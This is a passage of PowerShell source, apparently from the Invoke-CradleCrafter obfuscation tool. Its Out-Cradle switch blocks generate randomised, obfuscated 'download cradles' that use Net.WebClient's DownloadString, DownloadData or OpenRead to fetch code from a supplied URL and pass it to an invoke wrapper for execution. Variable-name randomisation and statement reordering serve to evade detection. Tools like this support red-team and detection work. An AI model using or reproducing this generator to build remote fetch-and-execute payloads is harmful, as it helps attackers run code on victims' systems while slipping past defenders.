                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray.
                            $ArrayIndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray += "$SetVar1$GetVar1.$GetVar4($GetVar2)"
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Add .Invoke to the end of $OpenRead if not default value of 'OpenRead'.
                        If($OpenRead.Contains("'OpenRead'"))
                        {
                            # Remove single quotes when OpenRead is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $OpenRead = $OpenRead.Replace("'OpenRead'","OpenRead")
                        }
                        Else
                        {
                            If($OpenRead.EndsWith('0>>>')) {$OpenRead = $OpenRead.SubString(0,$OpenRead.LastIndexOf('0>>>')) + '.Invoke0>>>'}
                            Else                           {$OpenRead = $OpenRead + '.Invoke'}
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()

                        $CommandArray2 += $CurrentModuleAutoLoadRandom + $SetVar1 + '(' + $NewObject.Replace($ModuleAutoLoadTag,'') + "Net.WebClient)"
                        $CommandArray2 += "$SetVar2'$Url'"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $Array2IndexOrder_01_LOCAL = $Array2IndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray2  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray2.
                            $Array2IndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray2 += "$SetVar1$GetVar1.$OpenRead($GetVar2)"
                            $CommandArray2 += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray2 += $Stream.Replace($GetVar4,$OpenRead)
                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01_LOCAL]   + $CommandArray[2,3,4,5,6,7] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01_LOCAL] + $CommandArray2[2,3,4,5]    -Join ';')}
                        }

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        4 {
            ####################################################
            ## [Net.WebClient]::New - DownloadString - PS3.0+ ##
            ####################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,"$NetWebClient::New()")
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,"$NetWebClientWithTags::New()")

                    $SyntaxToInvoke         = "$NetWebClient::New().$DownloadString('$Url')"
                    $SyntaxToInvokeWithTags = "$NetWebClientWithTags::New().$DownloadStringWithTags('$UrlWithTags')"

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,"($SyntaxToInvoke)").Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,"($SyntaxToInvokeWithTags)").Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,"($SyntaxToInvoke)") + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,"($SyntaxToInvokeWithTags)") + $CommandWithTags
                    }

                    # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                    $CradleSyntax         = $CradleSyntax.Replace(        '.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                    $CradleSyntaxWithTags = $CradleSyntaxWithTags.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wc'  # WebClient
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName4 = 'ds'  # DownloadString (Method)

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,"$NetWebClient::New()")
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,"$NetWebClientWithTags::New()")

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','DownloadString')
                    For($i=1; $i -le 2; $i++)
                    {
                        # Encapsulate DownloadString in single quotes if basic syntax is used.
                        If($DownloadString.Contains('DownloadString'))
                        {
                            $DownloadStringWithTags = $DownloadStringWithTags.Trim("'").Replace($DownloadString,("'" + $DownloadString + "'")).Replace("''","'")
                            $DownloadString         = "'" + $DownloadString.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Encapsulate DownloadString in single quotes if basic syntax is used.
                        If(!$DownloadString.Contains('DownloadString'))
                        {
                            If($DownloadString.StartsWith('<<<0')) {$DownloadString = $DownloadString.SubString(0,4) + '(' + $DownloadString.SubString(4)}
                            Else                                   {$DownloadString = '(' + $DownloadString}
                              
                            If($DownloadString.StartsWith('0>>>')) {$DownloadString = $DownloadString.SubString(0,$DownloadString.Length-4) + ')' + $DownloadString.SubString($DownloadString.Length-4)}
                            Else                                   {$DownloadString = $DownloadString + ')'}
                        }

                        # Encapsulate GetVar3 syntax if it contains whitespace.
                        If($GetVar3.Contains(' '))
                        {
                            $GetVar3 = "($GetVar3)"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1$NetWebClient::New()"
                        $CommandArray += "$SetVar3$DownloadString"
                          
                        $SyntaxToInvoke = "$GetVar1.$GetVar3($GetVar2)"

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                          
                        # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadString.Contains("'DownloadString'"))
                        {
                            $DownloadString = $DownloadString.Replace("'DownloadString'","DownloadString")
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1$NetWebClient::New()"
                        $CommandArray2 += "$SetVar2'$Url'"
                          
                        $SyntaxToInvoke = "$GetVar1.$DownloadString($GetVar2)"

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_012]  + $CommandArray[3,4]  -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3] -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadString         = $DownloadString.Replace(        $NewObjectNetWebClientTag,"$NetWebClient::New()")
                    $DownloadStringWithTags = $DownloadStringWithTags.Replace($NewObjectNetWebClientTag,"$NetWebClientWithTags::New()")

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','DownloadString')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # Encapsulate DownloadString in single quotes if basic syntax is used.
                        If(!$DownloadString.Contains('DownloadString'))
                        {
                            If($DownloadString.StartsWith('<<<0')) {$DownloadString = $DownloadString.SubString(0,4) + '(' + $DownloadString.SubString(4)}
                            Else                                   {$DownloadString = '(' + $DownloadString}
                              
                            If($DownloadString.StartsWith('0>>>')) {$DownloadString = $DownloadString.SubString(0,$DownloadString.Length-4) + ')' + $DownloadString.SubString($DownloadString.Length-4)}
                            Else                                   {$DownloadString = $DownloadString + ')'}
                        }

                        # Encapsulate GetVar3 syntax if it contains whitespace.
                        If($GetVar3.Contains(' '))
                        {
                            $GetVar3 = "($GetVar3)"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1($NetWebClient::New())"
                        $CommandArray += "$SetVar3$DownloadString"

                        $SyntaxToInvoke = "$GetVar1.$GetVar3($GetVar2)"

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                          
                        # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadString.Contains("'DownloadString'"))
                        {
                            $DownloadString = $DownloadString.Replace("'DownloadString'","DownloadString")
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1($NetWebClient::New())"
                        $CommandArray2 += "$SetVar2'$Url'"
                          
                        $SyntaxToInvoke = "$GetVar1.$DownloadString($GetVar2)"

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_012]  + $CommandArray[3,4]  -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3] -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        5 {
            ##################################################
            ## [Net.WebClient]::New - DownloadData - PS3.0+ ##
            ##################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,"$NetWebClient::New()")
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,"$NetWebClientWithTags::New()")

                    # Handle embedded tagging.
                    If($ByteWithTags.StartsWith('<<<0') -AND $ByteWithTags.EndsWith('0>>>'))
                    {
                        $ByteWithTags = $ByteWithTags.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                    }
                    If($JoinWithTags.StartsWith('<<<0') -AND $JoinWithTags.EndsWith('0>>>'))
                    {
                        $JoinWithTags = $JoinWithTags.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                    }

                    $SyntaxToInvoke         = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,"$NetWebClient::New().$DownloadData('$Url')"))
                    $SyntaxToInvokeWithTags = $JoinWithTags.Replace($JoinTag,$ByteWithTags.Replace($ByteTag,"$NetWebClientWithTags::New().$DownloadDataWithTags('$UrlWithTags')"))

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }

                    # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                    $CradleSyntax         = $CradleSyntax.Replace(        '.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                    $CradleSyntaxWithTags = $CradleSyntaxWithTags.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wc'  # WebClient
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName3 = 'ds'  # DownloadData (Method)

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 )

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','DownloadData','Join','Byte')
                    For($i=1; $i -le 2; $i++) 
                    {
                        # Encapsulate DownloadData in single quotes if basic syntax is used.
                        If($DownloadData.Contains('DownloadData'))
                        {
                            $DownloadDataWithTags = $DownloadDataWithTags.Trim("'").Replace($DownloadData,("'" + $DownloadData + "'")).Replace("''","'")
                            $DownloadData         = "'" + $DownloadData.Trim("'") + "'"
                        }
  
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Byte.StartsWith('<<<0') -AND $Byte.EndsWith('0>>>'))
                            {
                                $Byte = $Byte.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                            }
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1$NetWebClient::New()"
                        $CommandArray += "$SetVar3$DownloadData"
                          
                        $SyntaxToInvoke = "$GetVar1.$GetVar3($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
                          
                        # Remove single quotes when DownloadString is used directly as a method instead of a string stored in a variable (as in above command arrangement).
                        While($DownloadData.Contains("'DownloadData'"))
                        {
                            $DownloadData = $DownloadData.Replace("'DownloadData'","DownloadData")
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1$NetWebClient::New()"
                        $CommandArray2 += "$SetVar2'$Url'"
                          
                        $SyntaxToInvoke = "$GetVar1.$DownloadData($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                          
                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]  -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 4

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $DownloadData         = $DownloadData.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $DownloadDataWithTags = $DownloadDataWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Encapsulate DownloadData in single quotes if basic syntax is used.
                    If($DownloadData -eq 'DownloadData')
                    {
                        $DownloadDataWithTags = $DownloadDataWithTags.Replace($DownloadData,("'" + $DownloadData + "'"))
                        $DownloadData         = "'" + $DownloadData + "'"
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','DownloadData','Join','Byte')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}

                            # Handle embedded tagging.
                            If($Byte.StartsWith('<<<0') -AND $Byte.EndsWith('0>>>'))
                            {
                                $Byte = $Byte.Replace($ByteTag,('0>>>' + $ByteTag + '<<<0'))
                            }
                            If($Join.StartsWith('<<<0') -AND $Join.EndsWith('0>>>'))
                            {
                                $Join = $Join.Replace($JoinTag,('0>>>' + $JoinTag + '<<<0'))
                            }
                        }

                        # Encapsulate DownloadData in single quotes if basic syntax is used.
                        If(!$DownloadData.Contains('DownloadData'))
                        {
                            If($DownloadData.StartsWith('<<<0')) {$DownloadData = $DownloadData.SubString(0,4) + '(' + $DownloadData.SubString(4)}
                            Else                                 {$DownloadData = '(' + $DownloadData}
                              
                            If($DownloadData.StartsWith('0>>>')) {$DownloadData = $DownloadData.SubString(0,$DownloadData.Length-4) + ')' + $DownloadData.SubString($DownloadData.Length-4)}
                            Else                                 {$DownloadData = $DownloadData + ')'}
                        }

                        # Encapsulate GetVar4 syntax if it contains whitespace.
                        If($GetVar4.Contains(' '))
                        {
                            $GetVar4 = "($GetVar4)"
                        }

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1($NetWebClient::New())"
                        $CommandArray += "$SetVar4$DownloadData"

                        $SyntaxToInvoke = "$GetVar1.$GetVar4($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }
    
                        # Remove single quotes if default 'DownloadData' value is used.
                        If($DownloadData.Contains("'DownloadData'"))
                        {
                            # Remove single quotes when DownloadData is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $DownloadData = $DownloadData.Replace("'DownloadData'","DownloadData")
                        }
                      
                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1($NetWebClient::New())"
                        $CommandArray2 += "$SetVar2'$Url'"

                        $SyntaxToInvoke = "$GetVar1.$DownloadData($GetVar2)"
                        $SyntaxToInvoke = $Join.Replace($JoinTag,$Byte.Replace($ByteTag,$SyntaxToInvoke))

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = ($CommandArray[$ArrayIndexOrder_01]   + $CommandArray[2,3,4] -Join ';')}
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01] + $CommandArray2[2,3]  -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        6 {
            ##############################################
            ## [Net.WebClient]::New - OpenRead - PS3.0+ ##
            ##############################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wr'  # WebRequest
                    $RandomVarName2 = 'url' # Url
                    $RandomVarName3 = 'or'  # OpenRead (Method)
                    $RandomVarName4 = 'sr'  # StreamReader
                    $RandomVarName5 = 'res' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 5

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }
                      
